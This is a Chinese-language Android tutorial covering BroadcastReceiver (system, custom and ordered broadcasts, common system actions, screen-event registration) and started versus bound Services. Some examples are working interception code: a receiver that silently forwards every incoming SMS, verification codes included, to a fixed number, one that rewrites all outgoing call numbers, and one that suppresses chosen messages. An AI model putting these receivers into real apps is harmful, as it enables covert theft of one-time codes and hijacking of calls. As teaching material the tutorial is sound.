# BroadcastAndService

#涉及到的内容
1. 接收系统广播
2. 发送自定义广播
	- 无序广播
		- intent携带数据
	- 有序广播
		- 终止广播
		- 修改广播数据
		- 得到广播数据
		- 指定最终广播接受者，即使被终止，也会受到
3. 系统常用广播的配置 
4. 应用方面
	- 拦截短信
		- 串改短信内容
	- 拦截电话
		- 串改拨出的号码
5. 特殊情况 (屏幕开关的事件)
	- 代码注册
	- 代码注销

#BroadcastReceiver入门（一）
##什么是广播接受者
- BroadcastReceiver就是一台收音机
- 用来接收android系统发出的一些广播（不仅仅是系统发出的广播，我们也可自定义广播）
	- 可以理解为系统发出的广播室“中央人民广播电台”发出的官方广播
	- 而我们自定义的广播，是我们自己买了一个广播基站，自己发出的民间广播（例如：英语听力考试时，那个广播就是学校自己发出的广播）
- 无论是接收官方广播，还是民间广播，我们都需要一个收音机---BroadcastReceiver
##android系统为什么要发广播呢
- 现实中为什么要发广播呢，自然是有事情需要让广大人群接收到
	- 例如：英语听力考试，是为了让所有考生都能听到
- android系统里也有类似的需求，例如，下列情况就需要，让手机应用接收到消息
	- 手机快没电了（此时，需要提示用户，让用户保存数据）
	- 有短信进来了（注册时，验证码短信一收到，app马上感应到这个事件，并且提取到短信内容）
	- 有电话进来了或者打出一个电话（检测这个事件，可以在你打电话时，立即进行录音）
	- ...

##代码如何体现

同样是四大组件，完全可以类比Activity

1. 继承一个类BroadcastReceiver（相当于你买到一个收音机）


		public class MyReceiver extends BroadcastReceiver {
	
		    @Override
		    public void onReceive(Context context, Intent intent) {
		        Log.e("qqq","打电话");
		    }
		}

2. 清单注册（你开始配置这个收音机，主要是选择频道，你到底要听哪一个台的广播）

      	<receiver android:name=".MyReceiver">
            <intent-filter >//选择频道，在这里我们要接收拨出电话的事件
                <action android:name="android.intent.action.NEW_OUTGOING_CALL"/>
            </intent-filter>
        </receiver>
3. 特殊的广播需要添加权限，本例中，需要添加下列权限
	- `<uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>`

	此时，只要你拨打电话，就会执行MyReceiver中的onReceive方法，打印log

###演示如何获取外拨电话的号码，以及如何串改外拨电话号码
	    public class MyReceiver extends BroadcastReceiver {
	
	    @Override
	    public void onReceive(Context context, Intent intent) {
	//        获取外拨电话的电话号码
	//       （从当前的广播中抽取结果数据，一般为null，但这个事件中获得了外拨号码）
	        String phoneNumber = getResultData();
	        Log.e("qqq","打电话:"+phoneNumber);
	//        下面是设置外拨电话的号码，你会发现无论你打给谁，都打给了10010
	        setResultData("10010");
	    }
	}


###获得手机发来的短信，并且发送给指定号码
**所以说：不要随便装app，否则你的短信验证码被轻易盗取**

1. 继承BroadcastReceiver


		   public class MyReceiver extends BroadcastReceiver {
		
		    private String body;
		    private String sender;
		    private String number="111";
		
		    @Override
		    public void onReceive(Context context, Intent intent) {
		
		//        取出短信内容
		        Object[] objs = (Object[]) intent.getExtras().get("pdus");
		        String body = "";
		        String sender;
		        for (Object obj : objs) {
		            SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) obj);
		            body = smsMessage.getMessageBody();
		            sender = smsMessage.getOriginatingAddress();
		            Log.e("qqq", "短信内容：" + body + "\n发送者：" + sender);
		        }
		
		//        给指定号码发送短信
		        if (!"".equals(body)) {
		            // 获取短信管理器
		            android.telephony.SmsManager smsManager = android.telephony.SmsManager.getDefault();
		//            给指定号码发短信
		            smsManager.sendTextMessage(number, null, body, null, null);
		        }
		    }
		}
2. 清单注册

		<receiver
            android:name=".MyReceiver"
            android:enabled="true"
            android:exported="true">

            <intent-filter >
               <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
				//上面这个action name 系统是不会提示的（为了安全），需要你手动输入
            </intent-filter>

        </receiver>
3. 添加权限

		<uses-permission android:name="android.permission.RECEIVE_SMS"/>
		<uses-permission android:name="android.permission.READ_PHONE_STATE"/>





##不同android版本下BroadcastReceiver的不同表现
- 2.3以及2.3一下的版本，任何广播接受者apk只要被装到手机就立刻生效。不管应用程序进程是否运行。

- 4.0以及4.0以上的版本，要求应用程序必须有ui界面（activity） 广播接受者才能生效，如果用户点击了强行停止（设置---应用管理），应用程序就完全关闭了，广播接受者就失效了。如果用户没有点击过强行停止，即使应用程序进程不存在，也会自动的运行起来。
	- 目前的手机软件中点击“关闭所有应用”按钮，相当于点击了强行停止按钮，广播接受者也不会在启用



#BroadcastReceiver-发送自定义广播（二）
> 上面讲到的是如何接收系统广播，接下来讲一下如何发送自定义的广播
> 
> 注意：发送广播和接收广播可以写到不同的app里面，只要是在同一个手机内部，满足了action的过滤要求，即使是不同的app也可以收到这个广播

1. 发送自定义广播
	
		//        1.定义意图
		        Intent intent=new Intent();
		//        2.设置动作（字符串）
		        intent.setAction("com.example.hello");
		//        3.携带数据
		        intent.putExtra("data","自定义广播携带的数据");
		//        4.发送广播
		        sendBroadcast(intent);
		//      还可以发送指定权限的广播,如下：（需要自定义权限，不常用，略）
		//        sendBroadcast(Intent intent, String receiverPermission);

2. 接收广播（跟上文一样）

	- 继承BroadcastReceiver，重写onReceive方法


			public class CustomBroadcastReceiver extends BroadcastReceiver {
			    @Override
			    public void onReceive(Context context, Intent intent) {
					//接收数据
			        String data = intent.getStringExtra("data");
			        Log.e("qqq", "接收到了自定义广播:"+data);
		   		 }
			}
	- 清单文件配置，加action android:name="com.example.hello"

	 		 <receiver android:name=".CustomBroadcastReceiver">
	            <intent-filter>
	                <action android:name="com.example.hello"/>
	            </intent-filter>
	        </receiver>
	- 这里不需要设置权限



#BroadcastReceiver-发送有序广播（三）
> 上面发送的是无序广播，还可以发送有序广播，

##先说概念
>关键字
>
> - sendOrderedBroadcast  
> - setResultData   
> - abortBroadcast  
> - resultReceiver

 1. 无序广播 （广播发送的时候，接受者接受，没有先后顺序） 不可以通过setResultData携带数据

 		 sendBroadcast（）

	英语听力考试：

		无序广播不可以被拦截，不可以修改结果数据
		调用setResultData()会报错
		BroadcastReceiver trying to return result during a non-ordered 
		broadcastjava.lang.RuntimeException: BroadcastReceiver trying to return result during a non-ordered broadcast
                                                                               
                                                                               

	
2. 有序广播 （广播发送，接受者接受是按照优先级，先后顺序接受的），可以通过setResultData携带数据
3. 
		 /*
        * Intent intent:意图
        * String receiverPermission 接受者权限
        * BroadcastReceiver resultReceiver：指定最终接受者,设置后，无论如何都会收到广播，但数据会被前面的串改
        * Handler scheduler：消息处理者，null
        * int initialCode：初始码
        * Sring initialData：文件数据
        * Bundle initialExtras：intent里携带的额外数据
        * */
        * 
  		sendOrderedBroadcast(
	        Intent intent, String receiverPermission, BroadcastReceiver resultReceiver,
	        Handler scheduler, int initialCode, String initialData,
	        Bundle initialExtras) 
上级向下级拨款：

		广播发出10000元--->A(10000) ---> B(5000)----> C(1000) -----> D(200)

	    setResultData();//修改广播数据
	    abortBroadcast();//广播被拦截终止了。     
	
	有序广播可以被拦截，可以修改结果数据。

	如果指定了最终的接受者，最终的接受者一定会收到消息。
> 注意：
> 
> -  有序广播和无序广播都可以通过intent来携带数据
> 
> -  只是只有有序广播可以通过setResultData携带数据


##代码

1. 发送有序广播

		 /*
        * Intent intent:意图
        * String receiverPermission 接受者权限
        * BroadcastReceiver resultReceiver：指定最终接受者,设置后，无论如何都会收到广播，但数据会被前面的串改
        * Handler scheduler：消息处理者，null
        * int initialCode：初始码
        * Sring initialData：文件数据
        * Bundle initialExtras：intent里携带的额外数据
        * */
        sendOrderedBroadcast(intent, "com.permission.money",
                new DBroadcastReceiver(), null, 0, "拨款10000元", null);

2. 各个级别的广播接受者

	- ABroadcastReceiver



			public class ABroadcastReceiver extends BroadcastReceiver {
			    @Override
			    public void onReceive(Context context, Intent intent) {
			
			        Log.e("qqq", "我是A,收到:"+getResultData());
			        setResultData("拨款5000");
			    }
			}

	- BBroadcastReceiver



			public class BBroadcastReceiver extends BroadcastReceiver {
			    @Override
			    public void onReceive(Context context, Intent intent) {
			        abortBroadcast();
			
			        Log.e("qqq", "我是B,收到:"+getResultData());
			        setResultData("拨款3000");
			    }
			}


	- CBroadcastReceiver



			public class CBroadcastReceiver extends BroadcastReceiver {
			    @Override
			    public void onReceive(Context context, Intent intent) {
			        Log.e("qqq", "我是C,收到:"+getResultData());
			        setResultData("拨款1000");
			    }
			}


	- DBroadcastReceiver



			public class DBroadcastReceiver extends BroadcastReceiver {
			    @Override
			    public void onReceive(Context context, Intent intent) {
			
			        Log.e("qqq", "我是D,收到:"+getResultData());
			    }
			}

3. 清单配置

	- 设置自定义权限

		-  `<permission android:name="com.permission.money"/>`


	- 添加自定义权限

		- `<uses-permission android:name="com.permission.money"/>`


	- 配置广播接受者

	   		<receiver android:name=".ABroadcastReceiver">
	            <intent-filter android:priority="1000">
	                <action android:name="com.example.hello" />
	            </intent-filter>
	        </receiver>
	
	        <receiver android:name=".BBroadcastReceiver">
	            <intent-filter android:priority="900">
	                <action android:name="com.example.hello" />
	            </intent-filter>
	        </receiver>
	
	        <receiver android:name=".CBroadcastReceiver">
	            <intent-filter android:priority="800">
	                <action android:name="com.example.hello" />
	            </intent-filter>
	        </receiver>
	
	        <receiver android:name=".DBroadcastReceiver">
	            <intent-filter android:priority="700">
	                <action android:name="com.example.hello" />
	            </intent-filter>
	        </receiver>


###应用-如何拦截默认的短信,不让该手机收到此人发来的短信

- 上面提到的接受短信和外拨电话广播都属于有序广播
- 我们通过提高自己写的广播接受者的优先级,并种植广播的方法,来拦截手机短信

####代码

1. 提高优先级

		<receiver
		    android:name=".MyReceiver"
		    android:enabled="true"
		    android:exported="true">
		
		    <intent-filter android:priority="1000">
		        <action android:name="android.intent.action.NEW_OUTGOING_CALL"/>
		        <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
		    </intent-filter>
		</receiver>



2. 终止广播


		public class MyReceiver extends BroadcastReceiver {
		
		    private String body;
		    private String sender;
		    private String number;
		
		    @Override
		    public void onReceive(Context context, Intent intent) {
		
		//        取出短信内容
		        Object[] objs = (Object[]) intent.getExtras().get("pdus");
		        String body = "";
		        String sender;
		        for (Object obj : objs) {
		            SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) obj);
		            body = smsMessage.getMessageBody();
		            sender = smsMessage.getOriginatingAddress();
		            Log.e("qqq", "短信内容：" + body + "\n发送者：" + sender);
		        }
		        if (body.equals("9999999")){
		            abortBroadcast();
		        }
		
		    }
		}


#常用的系统广播（四）

###apk的安装/卸载/替换

1. 清单文件

 		<receiver android:name=".CustomBroadcastReceiver">
            <intent-filter>
                <action android:name="com.example.hello"/>
                <action android:name="android.intent.action.PACKAGE_ADDED"/>
                <action android:name="android.intent.action.PACKAGE_REMOVED"/>
                <action android:name="android.intent.action.PACKAGE_REPLACED"/>
                <!--必须配置data，否则，监测不到-->
                <data android:scheme="package"/>
            </intent-filter>
        </receiver>
2. CustomBroadcastReceiver

		public class CustomBroadcastReceiver extends BroadcastReceiver {
		    @Override
		    public void onReceive(Context context, Intent intent) {
		        String packageName = intent.getData().toString();
		        Log.e("qqq", ""+packageName);
		        String action = intent.getAction();
		        switch (action) {
		            case Intent.ACTION_PACKAGE_ADDED:
		                Log.e("qqq", "app安装");
		
		                break;
		
		            case Intent.ACTION_PACKAGE_REMOVED:
		                Log.e("qqq", "app卸载");
		                break;
		
		            case Intent.ACTION_PACKAGE_REPLACED:
		                Log.e("qqq", "app替换");
		                break;
		
		        }
		    }
		}
###SD卡的广播接受者
      <intent-filter >
          <action android:name="android.intent.action.MEDIA_MOUNTED"/>
          <action android:name="android.intent.action.MEDIA_REMOVED"/>
          <action android:name="android.intent.action.MEDIA_UNMOUNTED"/>
          <data android:scheme="file"/> 必须写data
      </intent-filter>
###开机启动的广播接受者
      <intent-filter >
          <action android:name="android.intent.action.BOOT_COMPLETED"/>
      </intent-filter>
      必须记得添加权限
      <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>

##特殊的广播
###屏幕开关的广播

- 不能在清单文件注册
	- 清单注册：即使广播接受者所在的应用被杀死，也会接受到广播
- 必须在代码注册   （registerReceiver）
	- 代码注册：如果广播接受者所在的应用被杀死，则接受不到广播
- 代码注册了，要记得注销   （unregisterReceiver）

####为什么呢

因为我们知道，如果用清单注册的广播接受者，即使广播接受者所在的app没有被启动，事件发生时，这个app会突然启动起来，并执行onReceiver里的操作，试想，如果手机开关屏幕这么频繁的事件，用清单注册后，每当屏幕开关一次，就会有很多app启动起来，这样是不合理的

所以必须采用代码注册，四大组件里也只有BroadcastReceiver可以在代码注册

####代码
		<receiver android:name=".ScreenOnBroadcastReceiver"/>
        <receiver android:name=".ScreenOffBroadcastReceiver"/>	


	public class MainActivity extends AppCompatActivity {
	
	    private ScreenOnBroadcastReceiver receiverOn;
	    private ScreenOffBroadcastReceiver receiverOff;
	
	    @Override
	    protected void onCreate(Bundle savedInstanceState) {
	        super.onCreate(savedInstanceState);
	        setContentView(R.layout.activity_main);
	        
	        receiverOn = new ScreenOnBroadcastReceiver();
	        registerReceiver(receiverOn, new IntentFilter(Intent.ACTION_SCREEN_ON));
	        receiverOff = new ScreenOffBroadcastReceiver();
	        registerReceiver(receiverOff, new IntentFilter(Intent.ACTION_SCREEN_OFF));
	
	    }
	
	    @Override
	    protected void onDestroy() {
	        super.onDestroy();
			//千万记得要注销代码注册的广播接受者，否则--->Leaked漏气
			//即注册广播的activity要被销毁时，一定要注销该广播接受者
	        unregisterReceiver(receiverOn);
	        unregisterReceiver(receiverOff);
	    }
	}

#Service

##什么是Service
- 一个组件长期后台运行，没有界面。

- 简单的理解：service理解成一个没有界面长期运行的activity。

- 特点：
	- 即使进程被杀死，稍后service会重新启动


##开启服务的第一种方式（很简单）

###前提（略）
> 1. 继承Service
> 2. 清单注册Service
###如何开启服务 

		startService(this,MyService.class)
###如何关闭服务


		stopService（）
> 也可以在手机上---打开设置---打开应用程序服务列表---点击停止来关闭服务


###startService方法开启服务的生命周期

- onCreate() -->onStartCommand-->onStart(过时） -->ondestory(销毁）
- 如果服务已经开启了，就不会重新调用oncreate方法，**服务只会被创建一次（oncreate只会被调用一次）**。
##开启服务的第二种方式（有点绕）
###Activity
    
	public class BindServiceActivity extends AppCompatActivity {
	
	    private MyBindService.MyBinder binder;
	    private ServiceConnection serviceConnection;
	
	    @Override
	    protected void onCreate(Bundle savedInstanceState) {
	        super.onCreate(savedInstanceState);
	        setContentView(R.layout.activity_bind_service);
	
	        serviceConnection = new ServiceConnection() {
	            /**
	             * 当服务被成功绑定的时候执行的方法，得到中间人IBinder service。
	             */
	            @Override
	            public void onServiceConnected(ComponentName name, IBinder service) {
	                binder = (MyBindService.MyBinder) service;
	                binder.callMethod();
	            }
	            /**
	             * 当服务失去绑定的时候调用的方法。当服务突然异常终止的时候
	             */
	            @Override
	            public void onServiceDisconnected(ComponentName name) {
	
	            }
	        };
	        bindService(new Intent(this, MyBindService.class), serviceConnection, BIND_AUTO_CREATE);
	    }
	
		    @Override
		    protected void onDestroy() {
		        super.onDestroy();
		//        一定要在activity销毁时，把这个activity绑定的service解绑，否则会leaked---漏气
		        unbindService(serviceConnection);
		    }
	}

###Service

	 public class MyBindService extends Service {
	    @Nullable
	    @Override
	    public IBinder onBind(Intent intent) {
	        Log.e("qwe", "onBind");
		//  返回的这个IBinder就是activity和service之间的通讯的中间人
		//  这里的IBinder将会在activity调用bindService绑定服务时所用的一个参数ServiceConnection的回调方法中获取
		//  获取到了这个IBinder，就相当于activity打通了service的内部，可以调用service内部的所有方法
		
		// IBinder是一个接口，不要实现这个接口（要重写的方法太多了），继承Binder（IBinder的一个实现类）即可
	        return new MyBinder();
	    }
	
	    @Override
	    public void onCreate() {
	        super.onCreate();
	        Log.e("qwe", "onCreate");
	    }
	
	    private void method() {
	        Toast.makeText(this, "我是写在Service内部的方法", Toast.LENGTH_SHORT).show();
	    }
	
	    @Override
	    public int onStartCommand(Intent intent, int flags, int startId) {
		//  在绑定服务开启服务时，不会走onStartCommand这个生命周期方法
	        Log.e("qwe", "onStartCommand");
	        return super.onStartCommand(intent, flags, startId);
	    }
	
	    @Override
	    public void onDestroy() {
	        Log.e("qwe", "onDestroy");
	
	        super.onDestroy();
	    }
	
	    public class MyBinder extends Binder {
	        /**
	         * 中间人帮助我们调用服务的方法。
	         * 中间人这里可以做很多事情
	         */
	        public void callMethod() {
	            method();
	        }
	    }
	}



###绑定服务总结
> 最核心的思路：
> 
> - activity里拿到service里的Ibinder
> - 通过Ibinder去和service通讯

> 最核心的方法是：
> 
> - activity里的binderService方法（参数ServiceConnection的回调方法的参数IBinder service）
> 
> - service里的onBinde方法（返回值Ibinder）



- 


1. 使用bindService的方式开启服务。
2. 
		bindService(intent, new MyConn(), Context.BIND_AUTO_CREATE);
2. 实现一个MyConn 服务与activity的通讯频道（中间人的联系渠道）
 
		private class MyConn implements ServiceConnection{
			/**
			 * 当服务被成功绑定的时候执行的方法，得到中间人。
			 */
			@Override
			public void onServiceConnected(ComponentName name, IBinder service) {
				binder = (MyBinder) service;
			}
			/**
			 * 当服务失去绑定的时候调用的方法。当服务突然异常终止的时候
			 */
			@Override
			public void onServiceDisconnected(ComponentName name) {
				
			}
		}
3. 服务成功绑定的时候 会执行onBinde方法，返回中间人

		 public class MyBinder extends Binder{
			 /**
			  * 内部人员帮助我们调用服务的方法。
			  */
			 public void callMethodInService(){
				 methodInService();
			 }
	 	}
4. 在调用者 activity代码里面通过中间人调用服务的方法。

5. 解除绑定服务 unbindService(conn)。


###绑定服务的生命周期 
 oncreate()-->onbind()--->onDestory(); 不会调用onstart()方法 和 onstartCommand()方法。

###开启服务的第二种方式更标准的写法---抽取接口隐藏私有方法
针对上例：

1. MyBinder为了让activity中可以调用，使用了public修饰符，但是这样带来一个坏处，因为MyBinder是Service的一个内部类，如果把他暴露给外界，外界就会通过MyBinder轻松地调用Service内部的所有方法，万一有些方法是隐秘的呢
2. 那么问题来了，又想让activity使用MyBinder的某个方法，又不想让activity直接拿到MyBinder的引用，该怎么办呢
3. ok，抽取接口IService，定义好准备要被外界调用的方法，在activity里强制转换Ibinder service为该接口IService，即可

代码：

IService

    public interface IService {
  	  public void callMethod();
	}
MyBindService的内部类

    private class MyBinder extends Binder implements IService {

        /**
         * 中间人帮助我们调用服务的方法。
         * 中间人这里可以做很多事情
         */
        @Override
        public void callMethod() {
            method();
        }

		//私密方法，不想让外界知道
        public void simifangfa() {
        }
    }

Activity

	private IService binder;
	 /**
     * 当服务被成功绑定的时候执行的方法，得到中间人IBinder service。
     */
    @Override
    public void onServiceConnected(ComponentName name, IBinder service) {
        binder = (IService) service;
        binder.callMethod();
    }


##开启服务的两种方法的对比

* startService(); 直接开启服务，服务一旦启动跟调用者（开启者没有任何关系）
	- 调用者activity退出了，服务还是继续运行活的好好的。
	- 调用者activity，没法访问服务里面的方法。 
</p>
* bindService();  绑定开启服务，服务和开启者（调用者）有密切的关系。
	- 只要activity挂了，服务跟着挂了。
	- 调用者activity，可以调用服务里面的方法。
